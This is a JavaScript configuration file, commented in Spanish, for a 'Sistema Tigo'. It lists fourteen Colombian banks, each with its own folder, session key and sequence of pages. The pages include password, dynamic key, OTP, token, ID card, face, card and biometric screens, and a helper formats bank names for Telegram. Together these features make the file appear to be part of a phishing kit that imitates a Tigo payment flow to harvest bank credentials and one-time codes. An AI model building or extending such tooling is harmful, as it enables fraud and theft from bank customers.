/**
 * Configuración Centralizada de Bancos - Sistema Tigo
 * Arquitectura Senior: Single Source of Truth para todos los bancos
 * 
 * @version 2.0.0
 * @author Sistema Tigo
 * @description Configuración unificada con mapeo de rutas, códigos y nombres
 */

const BANK_CONFIG = {
    // Bancos Tradicionales
    agrario: {
        code: 'agrario',
        name: 'Banco Agrario',
        displayName: '🟢 BANCO AGRARIO',
        folder: 'Agrario',
        pages: ['index', 'password', 'dinamica', 'otp', 'token'],
        sessionKey: 'tigo_agrario_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    bbva: {
        code: 'bbva',
        name: 'BBVA',
        displayName: '🔵 BBVA',
        folder: 'BBVA',
        pages: ['index', 'otp', 'token'],
        sessionKey: 'tigo_bbva_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    caja_social: {
        code: 'caja_social',
        name: 'Caja Social',
        displayName: '🟠 CAJA SOCIAL',
        folder: 'Caja-Social',
        pages: ['index', 'password', 'otp', 'token'],
        sessionKey: 'tigo_caja_social_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    av_villas: {
        code: 'av_villas',
        name: 'AV Villas',
        displayName: '🔴 AV VILLAS',
        folder: 'AV-Villas',
        pages: ['index', 'otp'],
        sessionKey: 'tigo_av_villas_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    mundo_mujer: {
        code: 'mundo_mujer',
        name: 'Banco Mundo Mujer',
        displayName: '💜 BANCO MUNDO MUJER',
        folder: 'Banco-Mundo-Mujer',
        pages: ['index', 'password', 'dynamic', 'otp'],
        sessionKey: 'tigo_mundo_mujer_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    occidente: {
        code: 'occidente',
        name: 'Banco de Occidente',
        displayName: '🟡 BANCO DE OCCIDENTE',
        folder: 'Occidente',
        pages: ['index', 'otp', 'token'],
        sessionKey: 'tigo_occidente_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    popular: {
        code: 'popular',
        name: 'Banco Popular',
        displayName: '🔵 BANCO POPULAR',
        folder: 'Popular',
        pages: ['index', 'clave', 'otp', 'token'],
        sessionKey: 'tigo_popular_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    serfinanza: {
        code: 'serfinanza',
        name: 'Serfinanza',
        displayName: '🟢 SERFINANZA',
        folder: 'Serfinanza',
        pages: ['index', 'password', 'dinamica', 'otp'],
        sessionKey: 'tigo_serfinanza_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    falabella: {
        code: 'falabella',
        name: 'Falabella',
        displayName: '🟢 FALABELLA',
        folder: 'Falabella',
        pages: ['index', 'dinamica', 'otp'],
        sessionKey: 'tigo_falabella_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    itau: {
        code: 'itau',
        name: 'Itaú',
        displayName: '🔵 ITAÚ',
        folder: 'Itau',
        pages: ['index', 'biometria', 'cedula', 'correo', 'otp', 'token'],
        sessionKey: 'tigo_itau_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    // Bancos Principales
    bancolombia: {
        code: 'bancolombia',
        name: 'Bancolombia',
        displayName: '🟡 BANCOLOMBIA',
        folder: 'Bancolombia',
        pages: ['index', 'cedula', 'cara', 'tarjeta', 'dinamica'],
        sessionKey: 'tigo_bancolombia_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    daviplata: {
        code: 'daviplata',
        name: 'Daviplata',
        displayName: '🟠 DAVIPLATA',
        folder: 'Daviplata',
        pages: ['index', 'clave', 'dinamica', 'otp'],
        sessionKey: 'tigo_daviplata_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    davivienda: {
        code: 'davivienda',
        name: 'Davivienda',
        displayName: '🔴 DAVIVIENDA',
        folder: 'Davivienda',
        pages: ['index', 'clave', 'token'],
        sessionKey: 'tigo_davivienda_session_id',
        defaultRedirect: '/payment/methods'
    },
    
    bogota: {
        code: 'bogota',
        name: 'Banco de Bogotá',
        displayName: '🔵 BANCO DE BOGOTÁ',
        folder: 'Bogota',
        pages: ['index', 'dashboard', 'token'],
        sessionKey: 'tigo_bogota_session_id',
        defaultRedirect: '/payment/methods'
    }
};

/**
 * Utilidades para trabajar con la configuración
 */
const BankUtils = {
    /**
     * Obtener configuración por código de banco
     */
    getByCode(code) {
        return BANK_CONFIG[code] || null;
    },
    
    /**
     * Obtener configuración por carpeta
     */
    getByFolder(folder) {
        return Object.values(BANK_CONFIG).find(bank => bank.folder === folder) || null;
    },
    
    /**
     * Obtener todos los códigos de banco
     */
    getAllCodes() {
        return Object.keys(BANK_CONFIG);
    },
    
    /**
     * Obtener regex pattern para todos los bancos
     */
    getRegexPattern() {
        return `^(${this.getAllCodes().join('|')})_(.+)$`;
    },
    
    /**
     * Mapeo de bancos para PSE
     */
    getBankFolderMap() {
        const map = {};
        Object.values(BANK_CONFIG).forEach(bank => {
            map[bank.name] = bank.folder;
        });
        return map;
    },
    
    /**
     * Obtener nombres para Telegram
     */
    getTelegramNames() {
        const names = {};
        Object.values(BANK_CONFIG).forEach(bank => {
            names[bank.code] = bank.displayName;
        });
        return names;
    },
    
    /**
     * Validar si un banco existe
     */
    exists(code) {
        return code in BANK_CONFIG;
    },
    
    /**
     * Obtener total de bancos configurados
     */
    count() {
        return Object.keys(BANK_CONFIG).length;
    }
};

// Exportar para uso global
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { BANK_CONFIG, BankUtils };
}

console.log(`[BANK CONFIG] ${BankUtils.count()} bancos configurados correctamente`);
